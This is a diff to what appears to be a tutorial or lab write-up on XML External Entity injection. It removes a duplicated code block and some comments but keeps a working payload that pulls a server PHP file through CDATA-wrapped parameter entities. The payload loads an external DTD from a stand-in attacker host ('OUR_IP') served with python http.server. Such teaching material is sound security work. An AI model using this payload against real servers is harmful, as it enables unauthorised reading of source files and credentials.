@@ -50,19 +50,15 @@ This will not work, since XML prevents joining internal and external entities.
 
 ```bash
 echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
-```
-
-```bash
-echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
 python3 -m http.server 8000
 ```
 
 ```xml
 <!DOCTYPE email [
-  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % begin "<![CDATA[">
   <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
-  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
-  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  <!ENTITY % end "]]>">
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
   %xxe;
 ]>
 ...
